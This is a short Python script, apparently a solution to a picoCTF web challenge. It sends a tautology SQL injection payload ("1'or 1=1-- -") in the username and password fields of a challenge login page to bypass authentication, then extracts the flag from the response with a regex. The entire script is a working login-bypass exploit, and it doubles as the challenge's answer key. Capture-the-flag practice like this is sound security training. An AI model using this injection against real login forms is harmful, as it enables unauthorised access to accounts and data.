import requests
import re

url = "https://jupiter.challenges.picoctf.org/problem/33850/login.php"
payload = {'username': "1'or 1=1-- -",
           "password": "1'or 1=1-- -", "debug": "0"}
r = requests.post(url, data=payload)
flag = re.findall(r'picoCTF{.*?}', r.text)[0]
print(flag)
